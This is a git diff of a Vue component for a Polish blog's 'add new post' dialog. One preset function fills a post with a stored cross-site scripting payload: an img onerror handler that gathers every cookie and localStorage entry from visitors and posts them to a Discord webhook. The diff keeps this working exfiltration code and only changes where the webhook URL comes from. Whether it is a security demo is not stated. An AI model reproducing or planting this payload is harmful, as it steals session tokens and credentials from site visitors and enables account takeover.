@@ -4,8 +4,6 @@
     <q-card style="width: min(600px, 100%)">
       <q-card-section>
         <div class="text-h6">Dodaj nowy post</div>
-
-        <!-- {{ process.env.WEBHOOK_URL }} -->
         <div class="q-pa-md q-gutter-sm">
 
           <q-input v-model="newPost.title" label="Tytuł" :rules="[val => !!val || 'Tytuł jest wymagany']" />
@@ -153,6 +151,8 @@ import { api } from 'src/boot/axios';
 const newPost = ref({ title: '', content: '' });
 const showModal = defineModel<boolean>();
 
+const discordWebhook = process.env.VITE_DISCORD_WEBHOOK
+
 const addPost = async () => {
   try {
     await api.post('/posts', { ...newPost.value, isNew: true }, {
@@ -181,7 +181,7 @@ const setNewPostContent2 = () => {
 
 const setNewPostContent3 = () => {
   newPost.value.title = 'Dzięki za dane ;)'
-  newPost.value.content = '<img src="xd" onerror="const webhookUrl = \'' + process.env.WEBHOOK_URL + '\'; const getCookiesList = () => { const cookies = document.cookie.split(\';\'); return cookies.map(cookie => cookie.trim()).join(\'\\n\'); }; const getLocalStorageList = () => { const localStorageData = Object.entries(localStorage); return localStorageData.map(([key, value]) => `${key}: ${value}`).join(\'\\n\'); }; const messageContent = `\\n ------- \\n **Cookies:**\\n${getCookiesList()}\\n\\n**LocalStorage:**\\n${getLocalStorageList()}\\n ------- \\n`; const sendToDiscord = async () => { const body = JSON.stringify({ content: messageContent }); try { const response = await fetch(webhookUrl, { method: \'POST\', headers: { \'Content-Type\': \'application/json\' }, body: body }); if (response.ok) { console.log(\'Wiadomość została wysłana!\'); } else { console.error(\'Wystąpił błąd podczas wysyłania wiadomości:\', response.status); } } catch (error) { console.error(\'Błąd:\', error); } }; sendToDiscord();" />';
+  newPost.value.content = '<img src="xd" onerror="const webhookUrl = \'' + discordWebhook + '\'; const getCookiesList = () => { const cookies = document.cookie.split(\';\'); return cookies.map(cookie => cookie.trim()).join(\'\\n\'); }; const getLocalStorageList = () => { const localStorageData = Object.entries(localStorage); return localStorageData.map(([key, value]) => `${key}: ${value}`).join(\'\\n\'); }; const messageContent = `\\n ------- \\n **Cookies:**\\n${getCookiesList()}\\n\\n**LocalStorage:**\\n${getLocalStorageList()}\\n ------- \\n`; const sendToDiscord = async () => { const body = JSON.stringify({ content: messageContent }); try { const response = await fetch(webhookUrl, { method: \'POST\', headers: { \'Content-Type\': \'application/json\' }, body: body }); if (response.ok) { console.log(\'Wiadomość została wysłana!\'); } else { console.error(\'Wystąpił błąd podczas wysyłania wiadomości:\', response.status); } } catch (error) { console.error(\'Błąd:\', error); } }; sendToDiscord();" />';
 }
 
 </script>
